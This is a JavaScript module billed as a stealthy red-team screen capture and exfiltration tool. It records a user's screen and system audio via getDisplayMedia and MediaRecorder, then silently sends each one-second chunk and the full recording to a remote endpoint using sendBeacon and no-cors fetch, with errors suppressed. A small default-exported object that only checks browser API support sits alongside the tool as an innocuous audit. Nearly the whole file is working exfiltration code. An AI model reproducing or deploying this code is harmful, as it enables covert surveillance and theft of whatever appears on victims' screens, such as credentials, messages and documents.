/**
 * screen_capture.js — Screen Capture & Exfiltration via getDisplayMedia
 *
 * This module provides:
 *   1. `streamDisplayMedia()` – a stealthy, production‑grade function that
 *      prompts the user for screen sharing (full screen, window, or tab),
 *      records the captured video/audio using MediaRecorder, and can
 *      exfiltrate the recording in real time or on stop to a remote server.
 *      Designed for authorised red‑team engagements and security audits.
 *
 *   2. Default export – a Pinpoint‑compatible `Screen_Share_API_Audit` that
 *      checks whether `navigator.mediaDevices.getDisplayMedia` is available.
 *
 * **Use only on systems you own or with explicit permission. Unauthorised
 *   screen capture is illegal.**
 */

// ---------------------------------------------------------------------------
// 1. Screen Capture Engine
// ---------------------------------------------------------------------------

/**
 * Requests screen capture via `getDisplayMedia()`, starts recording, and
 * optionally streams captured data to an exfiltration endpoint.
 *
 * @param {Object}   [options={}]
 * @param {number}   [options.videoBitsPerSecond=2500000]  – video bitrate.
 * @param {number}   [options.audioBitsPerSecond=128000]   – audio bitrate (if capturing audio).
 * @param {string}   [options.mimeType='video/webm; codecs=vp9'] – preferred MIME type; falls back to browser default.
 * @param {boolean}  [options.captureAudio=true]           – attempt to capture system audio (requires user consent).
 * @param {string}   [options.exfilEndpoint]               – URL to send recorded chunks/complete video.
 * @param {Function} [options.onStart]                     – called when recording starts: (stream, recorder).
 * @param {Function} [options.onChunk]                     – called when a data chunk is available: (blob, chunksArray).
 * @param {Function} [options.onStop]                      – called when recording stops: (fullBlob, durationMs).
 * @param {Function} [options.onError]                     – called on stream or recorder error.
 * @param {number}   [options.timeout=0]                   – auto‑stop after ms (0 = no timeout).
 * @returns {Promise<Object>} controller with `stop()`, `getStream()`, and `recorder`.
 */
export async function streamDisplayMedia(options = {}) {
    const {
        videoBitsPerSecond = 2500000,
        audioBitsPerSecond = 128000,
        mimeType = 'video/webm; codecs=vp9',
        captureAudio = true,
        exfilEndpoint = null,
        onStart = null,
        onChunk = null,
        onStop = null,
        onError = null,
        timeout = 0,
    } = options;

    // 1. Request screen capture stream
    let stream;
    try {
        stream = await navigator.mediaDevices.getDisplayMedia({
            video: true,
            audio: captureAudio,
        });
    } catch (err) {
        if (onError) onError(err);
        throw err; // caller must handle
    }

    // 2. Determine the best supported MIME type
    const supportedMime = MediaRecorder.isTypeSupported(mimeType)
        ? mimeType
        : (MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : undefined);

    const recorder = new MediaRecorder(stream, {
        mimeType: supportedMime,
        videoBitsPerSecond,
        audioBitsPerSecond: captureAudio ? audioBitsPerSecond : undefined,
    });

    const chunks = [];
    let stopCalled = false;

    // 3. Handle data availability
    recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
            chunks.push(event.data);
            // Real‑time exfiltration (fire‑and‑forget)
            if (exfilEndpoint) {
                _exfiltrateChunk(event.data, exfilEndpoint);
            }
            if (onChunk) {
                try { onChunk(event.data, chunks); } catch (_) { }
            }
        }
    };

    // 4. On stop: assemble final video and optionally send
    recorder.onstop = () => {
        const fullBlob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
        const duration = Date.now() - startTime;
        if (onStop) {
            try { onStop(fullBlob, duration); } catch (_) { }
        }
        // Final exfiltration of the whole recording
        if (exfilEndpoint && chunks.length > 0) {
            _exfiltrateFull(fullBlob, exfilEndpoint);
        }
        // Release camera/mic/screen
        stream.getTracks().forEach(track => track.stop());
    };

    recorder.onerror = (event) => {
        if (onError) onError(event.error);
    };

    // 5. Start recording
    recorder.start(1000); // deliver chunk every 1 second
    const startTime = Date.now();

    if (onStart) {
        try { onStart(stream, recorder); } catch (_) { }
    }

    // 6. Auto‑stop timeout
    if (timeout > 0) {
        setTimeout(() => {
            if (!stopCalled) {
                stopCalled = true;
                recorder.stop();
            }
        }, timeout);
    }

    return {
        stop() {
            if (!stopCalled) {
                stopCalled = true;
                recorder.stop();
            }
        },
        getStream: () => stream,
        recorder,
    };
}

// ---- Internal helpers for exfiltration ----

function _exfiltrateChunk(blob, endpoint) {
    try {
        navigator.sendBeacon(endpoint, blob);
    } catch (_) { }
    // fallback fetch (no‑cors)
    try {
        fetch(endpoint, { method: 'POST', mode: 'no-cors', body: blob });
    } catch (_) { }
}

function _exfiltrateFull(blob, endpoint) {
    // Prefer fetch for large files, beacons may fail for big blobs
    try {
        fetch(endpoint, { method: 'POST', mode: 'no-cors', body: blob });
    } catch (_) { }
    // Secondary beacon as fallback (may truncate)
    try {
        navigator.sendBeacon(endpoint, blob);
    } catch (_) { }
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Screen_Share_API_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'screen_capture',
    title: 'Screen_Share_API_Audit',
    level: 6,
    info: 'Audits navigator.mediaDevices.getDisplayMedia support for screen sharing capabilities.',
    steps: [
        'Check navigator.mediaDevices.getDisplayMedia support.',
        'Report display media API availability.',
    ],
    run: async () => {
        const supported =
            navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function';
        return {
            getDisplayMediaSupported: supported,
            message: supported
                ? 'Display Media (Screen Share) API is supported by this browser.'
                : 'Display Media (Screen Share) API is not supported by this browser.',
        };
    },
};

export default pinpointModule;